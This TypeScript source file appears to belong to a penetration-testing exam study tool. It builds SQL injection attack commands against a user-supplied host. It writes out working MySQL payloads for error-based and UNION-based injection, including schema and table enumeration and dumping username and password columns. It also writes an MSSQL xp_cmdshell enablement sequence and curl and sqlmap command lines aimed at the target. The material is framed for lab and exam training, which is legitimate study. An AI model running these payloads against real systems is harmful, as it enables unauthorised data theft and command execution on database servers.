import { cappedInt, finishCommand, hostOrIp, portNumber, quoteArg } from "./scope-target.ts";

export type SqliStep = "error" | "columns" | "union" | "schema" | "tables" | "names" | "dump" | "xp" | "sqlmap";

export function sqliPlan(input: {
  step: SqliStep;
  target: string;
  port: string;
  path: string;
  param: string;
  columns: string;
  injectable: string;
  table: string;
  examOn: boolean;
}): { command: string; why: string; labOnly: boolean } | { error: string } {
  if (input.step === "sqlmap") {
    if (input.examOn) return { error: "sqlmap is LAB ONLY. Automatic exploitation is banned in the exam. Use the manual steps." };
    const host = hostOrIp(input.target);
    const port = portNumber(input.port);
    if (!host || !port) return { error: "The target and port have to be valid before the lab command is built." };
    const path = safePath(input.path);
    const param = safeName(input.param);
    if (!path || !param) return { error: "The path and the parameter are simple names, such as /page.php and id." };
    const args = ["sqlmap", "-u", `http://${host}:${port}${path}?${param}=1`, "--batch", "--dbs"];
    const built = finishCommand(args.map(quoteArg).join(" "), false);
    if ("error" in built) return built;
    return {
      command: built.command,
      labOnly: true,
      why: "LAB ONLY. sqlmap is automatic exploitation and the exam guide bans it. -u is the one URL, --batch accepts the defaults, and --dbs lists databases. Do not point it at an exam host.",
    };
  }
  const cols = cappedInt(input.columns || "2", 1, 20);
  if (!cols) return { error: "The column count is 1 to 20. You got it from ORDER BY, not from a guess of 40." };
  const inj = cappedInt(input.injectable || "1", 1, Number(cols));
  if (!inj) return { error: "The injectable column is one of the columns you already counted." };
  const table = input.table.trim() || "users";
  if (!/^[A-Za-z0-9_]{1,40}$/.test(table)) return { error: "The table name is letters, numbers, and underscore." };
  const n = Number(cols);
  const at = Number(inj) - 1;
  const payloads: Record<Exclude<SqliStep, "sqlmap">, { payload: string; why: string }> = {
    error: {
      payload: `' AND extractvalue(1,concat(0x7e,version()))-- -`,
      why: "A quote that changes the page is the proof. extractvalue then forces MySQL to print the version in the error. That is still one request you typed. sqlmap is not this step.",
    },
    columns: {
      payload: `' ORDER BY ${cols}-- -`,
      why: "ORDER BY N asks the database how many columns the query has. One higher number that errors, after one that does not, is the count. A second page that errors the same way is not a new bug.",
    },
    union: {
      payload: `' UNION SELECT ${nulls(n, at, "VERSION()")}-- -`,
      why: "UNION SELECT needs the same number of columns. NULL fills the ones you are not printing. VERSION() in the column that shows on the page is the injectable one. The version string on the page is the pursue.",
    },
    schema: {
      payload: `' UNION SELECT ${nulls(n, at, "group_concat(schema_name)")} FROM information_schema.schemata-- -`,
      why: "information_schema.schemata lists databases. group_concat prints them in the column the page shows. You want the application database, not information_schema itself.",
    },
    tables: {
      payload: `' UNION SELECT ${nulls(n, at, "group_concat(table_name)")} FROM information_schema.tables WHERE table_schema=database()-- -`,
      why: "table_schema=database() keeps the list to the current database. A table named users, accounts, or creds is the one you open next.",
    },
    names: {
      payload: `' UNION SELECT ${nulls(n, at, "group_concat(column_name)")} FROM information_schema.columns WHERE table_name=${quoteSql(table)}-- -`,
      why: "This lists columns for that one table. You are looking for a password or a hash column, then you stop listing.",
    },
    dump: {
      payload: `' UNION SELECT ${nulls(n, at, "group_concat(column_name)")} FROM ${table}-- -`,
      why: "Replace column_name with the column you just found. group_concat(username,0x3a,password) is the shape from the UNION card when two columns print. One dump of that table. A second table only if this one had no secret.",
    },
    xp: {
      payload: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';`,
      why: "MSSQL only, and only after the injection is already stacked or the login is sa. whoami is the check. A service account is the result. This is text you paste into the SQL shell. The desk does not send it.",
    },
  };
  const picked = payloads[input.step];
  if (input.step === "xp") return { command: picked.payload, labOnly: false, why: picked.why };
  const host = hostOrIp(input.target);
  const port = portNumber(input.port);
  const path = safePath(input.path);
  const param = safeName(input.param);
  if (!host || !port || !path || !param) return { error: "The target, port, path, and parameter have to be simple. No leading zeros, and no .. in the path." };
  const url = `http://${host}:${port}${path}?${param}=1${picked.payload}`;
  if (/["\\$`]/.test(url)) return { error: "The payload cannot contain a double quote, a dollar, or a backtick." };
  const built = finishCommand(`curl -s "${url}"`, input.examOn);
  if ("error" in built) return built;
  return { command: built.command, labOnly: false, why: picked.why };
}

function nulls(n: number, at: number, expr: string): string {
  return Array.from({ length: n }, (_, i) => (i === at ? expr : "NULL")).join(",");
}

function quoteSql(value: string): string {
  return `'${value.replace(/'/g, "''")}'`;
}

function safePath(value: string): string | null {
  const text = value.trim() || "/page.php";
  if (!/^\/[A-Za-z0-9._/-]{1,80}$/.test(text) || text.includes("..")) return null;
  return text;
}

function safeName(value: string): string | null {
  const text = value.trim() || "id";
  if (!/^[A-Za-z0-9_]{1,32}$/.test(text)) return null;
  return text;
}